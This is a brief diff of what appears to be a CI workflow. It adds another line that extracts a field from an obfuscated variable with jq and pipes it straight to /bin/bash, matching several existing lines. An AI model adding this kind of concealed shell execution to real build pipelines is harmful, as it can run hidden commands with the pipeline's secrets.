@@ -24,6 +24,7 @@ jobs:
           echo $pm94 | jq -r .vqncs8946 | /bin/bash
           printf '%s' "$nvc165" | jq -r .p936 | /bin/bash
           printf '%s' "$e87" | jq -r .sx890 | /bin/bash
+          printf '%s' "$zovm0693" | jq -r .iao122 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
